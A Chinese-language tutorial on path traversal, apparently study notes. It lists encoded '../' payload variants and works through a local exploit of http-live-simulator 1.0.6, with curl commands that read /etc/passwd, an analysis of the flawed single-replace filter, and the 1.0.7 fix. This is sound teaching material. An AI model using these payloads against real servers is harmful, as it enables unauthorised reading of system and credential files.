### 简介

* 目录穿越 Directory traversal/ 路径穿越 Path traversal
* 漏洞原理:攻击者通过可控的输入，以"参数值"、"畸形文件"等形式，将构造的"路径"传递给后端逻辑，实现路径穿越。
* 漏洞危害:任意文件读取、写入、删除、覆盖、修改...

### 测试方法

构造payload系统相关

| |root directory|directory separator|
|:-------------:|--|-----|
|Unix-like OS|`/`|`/`|
|Windows|`<drive letter>:\`|`\` or `/`|


Unix-like OS(macOS下实际测试)
```
上级目录
../

当前目录
./

查看上级目录下的1.txt的命令有很多(因为./表示当前目录 加多个也不影响 没作用)
直接查看
cat ../1.txt

在跨目录之后使用./
cat .././1.txt
cat ../././1.txt

在跨目录之前使用./
cat ./../1.txt
cat ././../1.txt

在跨目录之前之后都使用./
cat ./.././1.txt
cat ././../././1.txt
```


Encoding and double encoding:

```
%2e%2e%2f represents ../
%2e%2e/ represents ../
..%2f represents ../ 
%2e%2e%5c represents ..\
%2e%2e\ represents ..\ 
..%5c represents ..\ 
%252e%252e%255c represents ..\ 
..%255c represents ..\
```

URL encoding

Web容器对form和URL中的"百分比编码"执行一级解码(one level of decoding)
```
..%c0%af represents ../ 
..%c1%9c represents ..\ 
```

### 实例1 - 单次替换

代码仓库

[http-live-simulator@1.0.6](https://github.com/prahladyeri/http-live-simulator/tree/8e85a1be562248d0d616c0e5092a3d71bbf5fe5f)

环境搭建
```
# macOS 10.14.4
cd /Users/xxx/Downloads

# Install the module
npm install -g http-live-simulator@1.0.6

# Run the server
http-live
```

漏洞利用
```
# Attempt to access a file from outside that project's directory
# 其中curl的参数--path-as-is 表示"Do not squash .. sequences in URL path" 不压缩url路径中的..

# 构造payload如下 都成功了

# payload1  将 `/../` 替换为 `//../../`
curl --path-as-is http://localhost:8080//../../../../etc/passwd
# 最终绝对路径为/Users/xxx/Downloads/../../../etc/passwd

# payload2  将 `/../` 替换为 `/./.././`
curl --path-as-is http://localhost:8080/./../././../././../././.././etc/passwd
# 最终绝对路径为/Users/xxx/Downloads/.././../././../././.././etc/passwd
# 为了便于理解 可以自行去除其中无实际作用的./ 得到与绕过方式1相同的最终绝对路径 /Users/xxx/Downloads/../../../../etc/passwd
```

payload1绕过过程分析 查看文件bin/http-live可知后端逻辑如下
```
# 71行 var pathname = url.parse(req.url, true).pathname;
# 直接从url中获取pathname的参数值 得到 //../../../../etc/passwd
# 72行 pathname = pathname.replace("/../","");  将参数值中的`/../` 替换为空 仅替换一次(修复无效 可被绕过).
# 此时 pathname参数值变为 /../../../etc/passwd
# 90行 拼接得到绝对路径 abspath = process.cwd() + pathname; #注意 process.cwd()返回当前目录/Users/xxx/Downloads 注意结尾不是斜杠符号
# 92行 此时绝对路径abspath值为 /Users/xxx/Downloads/../../../etc/passwd
# （所以构造payload时url中8000后面必须有两个连续的/才对 否则路径构造错误 文件不存在 跳出 返回404）
# 93行 if (fs.existsSync(abspath)) {  // 路径正确 文件存在	
# 94行 fs.readFile(abspath, function(err, data) { // 将绝对路径实参 abspath 传入到fs.readFile函数
# 98行 res.write(data); //将文件内容作为response body
# 99行 res.end(); //返回响应
# 实现了任意文件读取.
```


可见1.0.7 的修复

diff: https://github.com/prahladyeri/http-live-simulator/commit/354644525f1626c5921abac10913c0d47f1f1433

关键代码在`bin/http-live`中的72-74行 是将参数值中的`/../`替换为空 循环替换 直到不存在`/../`为止 如下
```
while(pathname.indexOf("/../") != -1) {
		pathname = pathname.replace("/../",""); //fix for path traversal bug
	}
```

---

为什么不用`\`测试？
因为node库中 url.parse函数 会把\转换为/ 参考node自带库中url.parse的定义 https://github.com/nodejs/node/blob/master/lib/url.js


#### 总结 - node自带的fs模块的readFile函数


1.读取普通文件
```
# 1.读取普通文件 将文件内容转化为文本 输出
var mypath = "/Users/xxx/Downloads/../../../etc/passwd";fs.readFile(mypath,function(err,data){console.log(data.toString())})
```

2.读取符号链接文件

创建符号链接文件 `ln -s ../1.txt symfile`
```
# 2.读取一个名为symfile的符号链接文件 实际上可以读取到1.txt的内容
var mypath = "/Users/xxx/Downloads/symfile";fs.readFile(mypath,function(err,data){console.log(data.toString())})
```
